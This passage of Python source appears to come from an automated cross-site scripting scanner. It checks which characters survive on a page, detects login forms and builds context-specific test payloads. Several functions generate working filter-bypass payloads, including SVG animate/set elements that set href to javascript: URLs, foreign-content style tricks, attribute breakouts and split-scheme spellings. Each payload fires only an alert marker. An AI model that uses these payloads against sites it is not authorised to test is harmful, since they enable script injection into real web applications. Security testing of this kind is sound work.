        return urlunparse(parsed._replace(query="&".join(pairs)))
    pairs = keep + [(param, value)]
    query = urlencode(pairs)
    if "%" in value:
        query = query.replace("%25", "%")
    return urlunparse(parsed._replace(query=query))


def _snippet(body: str, needle: str, window: int = 60) -> str:
    if not body or not needle:
        return ""
    idx = body.find(needle)
    if idx == -1:
        idx = body.lower().find(needle.lower())
    if idx == -1:
        return ""
    start = max(0, idx - window)
    end = min(len(body), idx + len(needle) + window)
    return body[start:end].replace("\n", " ")


def _reflection_rank(html: str, needle: str, pos: int) -> Optional[int]:
    """Position of the reflection at *pos* in the ordered list of reflections.

    Lets a follow-up request address "the second echo" without needing the two
    documents to share offsets.
    """
    positions = [m.start() for m in re.finditer(re.escape(needle), html or "")]
    if pos not in positions:
        return None
    return positions.index(pos)


def _nth_occurrence(html: str, needle: str, rank: Optional[int]) -> Optional[int]:
    """Offset of the *rank*-th occurrence of *needle* (0-based), or ``None``."""
    if rank is None or not html or not needle:
        return None
    hits = [m.start() for m in re.finditer(re.escape(needle), html)]
    if rank >= len(hits):
        return None
    return hits[rank]


def _chars_that_matter(ctx: InjectionContext, hit) -> List[str]:
    """Characters whose survival decides the payload shape for this context.

    Deliberately context-driven rather than a blanket list: in an HTML
    attribute the only question is whether the delimiter can be closed, and
    what can be introduced after it; in a JS string it is the quote and the
    backslash; in a URL the scheme separators. Probing characters that cannot
    change the answer wastes a request per parameter.
    """
    c = ctx
    if c in (
        InjectionContext.HTML_ATTR_DOUBLE,
        InjectionContext.HTML_ATTR_SINGLE,
    ):
        # Both quotes: one closes the attribute, the other is what the JS
        # argument inside the injected handler will be written with. A page
        # that encodes the apostrophe only in its text node reports it as
        # encoded for the whole body, and that verdict then removes every
        # payload whose ``alert('…')`` needs it.
        return sorted({hit.quote_char or '"', "'", '"', "<", ">"})
    if c == InjectionContext.HTML_ATTR_UNQUOTED:
        return [" ", "'", '"', "<", ">"]
    if c in (InjectionContext.HTML_TEXT, InjectionContext.HTML_COMMENT,
             InjectionContext.TITLE, InjectionContext.TEXTAREA):
        return ["<", ">"]
    if c in (InjectionContext.JS_STRING_SINGLE, InjectionContext.JS_STRING_DOUBLE,
             InjectionContext.JS_TEMPLATE):
        return [hit.payload_quote or "'", "\\", "</", "<"]
    if c == InjectionContext.JS_IN_ATTR:
        return [hit.payload_quote or "'", "(", "\\"]
    if c == InjectionContext.HTML_ATTR_HREF:
        return [":", "<", ">"]
    if c == InjectionContext.JS_CODE:
        return ["(", "=", ";"]
    return []


def _merge_char_probe(
    base, param: str, verdicts: Dict[str, str]
):
    """Apply per-point verdicts over the stacked probe's body-wide guess."""
    allowed = set(base.allowed_chars)
    blocked = set(base.blocked_chars)
    encoded = dict(base.encoded_chars)
    for ch, verdict in verdicts.items():
        allowed.discard(ch)
        blocked.discard(ch)
        encoded.pop(ch, None)
        if verdict == "allowed":
            allowed.add(ch)
        elif verdict == "encoded":
            encoded[ch] = ch
        elif verdict == "escaped" and ch in _CHAR_ENTITY:
            # A backslash-prefixed delimiter is not gone: the app escaped it
            # after reading the input, so its HTML entity arrives afterwards and
            # the browser turns it back into the real character. The *named*
            # entity is what survives here: on a lab that backslash-escapes the
            # apostrophe, ``&apos;`` reaches the handler as a bare quote while
            # the numeric spellings are dropped outright.
            encoded[ch] = _CHAR_ENTITY[ch]
        elif verdict == "escaped":
            # Every other character is simply inert behind the backslash: there
            # is no entity that turns ``\(`` into ``(``. Counting it as a
            # workaround is a trap — the payload builder would then be handed a
            # character it cannot actually emit, and spend its whole request
            # budget on candidates that could never run.
            blocked.add(ch)
        elif verdict == "blocked":
            blocked.add(ch)
    return CharProbeResult(
        param=param,
        reflected=base.reflected,
        allowed_chars=allowed,
        blocked_chars=blocked,
        encoded_chars=encoded,
        raw_reflection=base.raw_reflection,
    )


def _allowlist_payloads(
    tag: str, event: str, marker: str, ctx: "ContextAnalysis"
) -> List[str]:
    """Payloads built from the elements this target actually accepts.

    Ordered so the first candidate closes the context it lands in: a target
    that blocks ``<img>`` still lets ``<math>`` open foreign content, and a
    nested ``<style>`` inside it puts the parser in a text state where a plain
    ``<xss onfocus=…>`` becomes a real element again. Handlers are whatever the
    probe found rather than a fixed one, because an allowlist that permits
    ``onbeforetoggle`` almost never permits ``onerror``.
    """
    call = f"alert('{marker}')"
    focusable = f'<{tag} tabindex=1 autofocus {event}="{call}">'
    out: List[str] = []

    if ctx.context in (
        InjectionContext.HTML_ATTR_DOUBLE,
        InjectionContext.HTML_ATTR_SINGLE,
        InjectionContext.HTML_ATTR_UNQUOTED,
    ):
        q = ctx.quote_char or '"'
        out.append(f"{q} tabindex=1 autofocus {event}={call} x={q}")

    if tag in ("math", "svg"):
        # Foreign content accepts <style>, whose contents are raw text until
        # "</style>"; a permitted sibling element therefore escapes the filter
        # that was applied to the original tag list.
        out += [
            f"<{tag}><style><xss tabindex=1 autofocus {event}={call}></style>",
            f"<{tag}><mtext><style><xss tabindex=1 autofocus {event}={call}></style>",
            f"<{tag}><mtext><table><mglyph><style><xss tabindex=1 autofocus {event}={call}></style>",
            f"<{tag}><style><img src=x onerror={call}></style>",
        ]

    # Events that only exist in combination with another attribute: without the
    # companion, an accepted handler is dead code and the browser never calls
    # it, which looks exactly like a blocked one.
    if event in _NESTED_ANIMATOR_EVENTS:
        # The animator fires inside its container, so the accepted tag is the
        # wrapper: put the child where the browser will actually animate it.
        # ``<animate>`` needs a target attribute to run; ``<set>`` and
        # ``<animatetransform>`` start from the attribute alone.
        wrapper = tag if tag in ("svg", "math") else "svg"
        for child in _SVG_ANIMATORS + ("set",):
            if child == "animate":
                # <animate> only starts once it has an attribute to drive;
                # without one it is inert and the handler never fires.
                out.append(
                    f"<{wrapper}><animate attributeName=x dur=5s {event}={call}>"
                    f"</{wrapper}>"
                )
                out.append(
                    f"<{wrapper}><animate attributeName=x dur=5s {event}={call}>"
                    f"</animate></{wrapper}>"
                )
                continue
            out.append(f"<{wrapper}><{child} {event}={call}></{wrapper}>")
            out.append(
                f"<{wrapper}><{child} {event}={call}></{child}></{wrapper}>"
            )

    companions = {
        "onbeforetoggle": ["popover", "popover=auto"],
        "oncontentvisibilityautostatechange": ["style=content-visibility:auto"],
        "onscrollend": ["style=overflow:auto;height:1px", "tabindex=1"],
        "ontoggle": ["open"],
    }.get(event, [])
    for extra in companions:
        out.append(f"<{tag} {extra} {event}={call}>")
        out.append(f'<{tag} {extra} tabindex=1 autofocus {event}="{call}">')

    out += [
        focusable,
        f"<{tag} {event}={call}>",
        f"<{tag} id=ixp tabindex=1 autofocus {event}={call}>",
        f'<{tag} title="x" {event}={call}>',
    ]
    # Dedupe while preserving order.
    seen: set = set()
    return [p for p in out if not (p in seen or seen.add(p))]


_LOGIN_PATH = re.compile(
    r"(?:^|/)(?:login|log-in|signin|sign-in|auth|session/new|users/sign_in)(?:[/?#]|$)",
    re.I,
)
_LOGIN_HINTS = ("password", "passwd", "pass")


def _is_login_redirect(requested: str, final: str) -> bool:
    """True when *requested* was answered by a login page at another path.

    A redirect to the *same* path (a trailing-slash normalisation, a redirect to
    ``?id=``) is not a login: only a different path that reads as an
    authentication form counts.
    """
    if not requested or not final:
        return False
    try:
        a, b = urlparse(requested), urlparse(final)
    except Exception:
        return False
    if (a.hostname or "").lower() != (b.hostname or "").lower():
        return False
    if (a.path.rstrip("/") or "/") == (b.path.rstrip("/") or "/"):
        return False
    return bool(_LOGIN_PATH.search(b.path or ""))


def _form_fields(page: str) -> List[str]:
    """Every named field in the first form that asks for a password."""
    best: List[str] = []
    for block in re.findall(r"<form\b.*?</form>", page or "", re.S | re.I):
        names = re.findall(
            r"<(?:input|textarea|select)\b[^>]*\bname=[\"']?([A-Za-z0-9_\-\[\]]+)", block, re.I
        )
        if not names:
            continue
        lowered = block.lower()
        if any(h in lowered for h in _LOGIN_HINTS):
            return list(dict.fromkeys(names))
        if not best:
            best = list(dict.fromkeys(names))
    return best


def _is_fragment_name(name: str) -> bool:
    """Whether a parameter name is the URL-hash pseudo-parameter."""
    return name in ("#fragment", "fragment", "#")


def _hidden_values(page: str) -> dict:
    """Every ``type=hidden`` value the page asks to be posted back.

    A login form's only required hidden field is usually a CSRF token, but it is
    read generically: whatever the page put there is what the server will check.
    """
    out: dict = {}
    for tag in re.findall(r"<input\b[^>]*>", page or "", re.I):
        if not re.search(r"\btype\s*=\s*[\"']?hidden", tag, re.I):
            continue
        name = re.search(r"\bname\s*=\s*[\"']?([^\"'\s>]+)", tag, re.I)
        if not name:
            continue
        value = re.search(r"\bvalue\s*=\s*(?:\"([^\"]*)\"|'([^']*)'|([^\s>]+))", tag, re.I)
        out[name.group(1)] = (value.group(1) or value.group(2) or value.group(3) or "") if value else ""
    return out


def _user_field(fields: List[str]) -> str:
    for name in fields:
        if name.lower() in ("username", "user", "email", "emailaddress", "login", "userid"):
            return name
    return next((f for f in fields if f.lower() not in _LOGIN_HINTS), "")


def _pass_field(fields: List[str]) -> str:
    return next((f for f in fields if any(h in f.lower() for h in _LOGIN_HINTS)), "")


def _jar_cookies(client) -> dict:
    """Read the session out of the client's jar as ``name -> value``."""
    try:
        jar = client._session.cookie_jar  # type: ignore[union-attr]
        return {c.key: c.value for c in jar}
    except Exception:
        return {}


# Attributes whose *value* a browser still acts on after it has stripped every
# event handler and every ``href``/``xlink:href``. SVG animation is the only
# markup family where that is true: the animator rewrites another attribute at
# run time, so the scheme never appears in any attribute the filter inspects.
# ``attributeName`` names the target and ``values`` (or ``from``/``to``) carries
# it, both of which a blocklist keyed on dangerous attribute *names* lets pass.
_ANIMATED_ATTR_PAYLOADS = (
    '<svg><a><animate attributeName=href values={call} />'
    "<text x=20 y=20>go</text></a></svg>",
    "<svg><a><animate attributeName=href values={call} />"
    "<text x=20 y=20>go</text></a></svg>",
    '<svg><a><set attributeName=href to={call} />'
    "<text x=20 y=20>go</text></a></svg>",
    "<svg><a><animate attributeName=href from={call} />"
    "<text x=20 y=20>go</text></a></svg>",
)

# The scheme spellings a naive value filter compares against ``javascript:``.
# The browser collapses tabs and newlines before it decides the scheme, so
# either survives a filter that only lowercases the string.
_SCHEME_SPELLINGS = ("javascript:", "java\tscript:", "JAVASCRIPT:")


def _needs_activation(payload: str) -> bool:
    """True when the payload only runs after a user gesture.

    An ``<a href>`` animated by SVG has no handler to fire: the browser runs the
    scheme when the link is *clicked*. The confirmer must know that, because a
    page that loads this payload and does nothing looks identical to a page that
    rejected it.
    """
    return "animate attributeName=href" in payload or "set attributeName=href" in payload


def _allowlist_attr_payloads(marker: str) -> List[str]:
    """Payloads that need no surviving event handler, ordered by likely success.

    Used when the allowlist probe finds a permitted element but no permitted
    handler: at that point the filter is known to be vetting attribute *names*,
    and the only markup left is one whose value a browser still obeys.
    """
    call = f"javascript:alert('{marker}')"
    out: List[str] = []
    for spelling in _SCHEME_SPELLINGS:
        value = call if spelling == "javascript:" else spelling + f"alert('{marker}')"
        out += [tpl.format(call=value) for tpl in _ANIMATED_ATTR_PAYLOADS]
    seen: set = set()
    return [p for p in out if not (p in seen or seen.add(p))]


def _finding_key(f: XSSFinding) -> str:
    """Identity of a reported vulnerability, marker-independent.

    Each confirmation attempt carries its own ``ixm…`` marker, so keying on the
    raw payload makes one discovering parameter look like N distinct findings.
    The identity of the flaw is the endpoint, the parameter and the context it
    lands in; the payload is evidence, not identity.
    """
    from urllib.parse import urlparse

    path = urlparse(f.url).path if f.url else ""
    payload = re.sub(r"ixm[0-9a-f]{6,}", "ixm*", f.payload or "")
    return (
        f"{path}|{f.parameter}|{f.method}|{payload}|"
        f"{f.vulnerability_type}|{f.context.value}"
    )


def _is_new_finding(existing: List[XSSFinding], finding: XSSFinding) -> bool:
    key = _finding_key(finding)
    return all(_finding_key(e) != key for e in existing)


def _dedupe_findings(findings: List[XSSFinding]) -> List[XSSFinding]:
    out: List[XSSFinding] = []
    seen: set = set()
    for f in findings:
        k = _finding_key(f)
        if k in seen:
            continue
        seen.add(k)
        out.append(f)
    return out


def result_to_json(result: ScanResult) -> str:
    return json.dumps(result.to_dict(), indent=2)
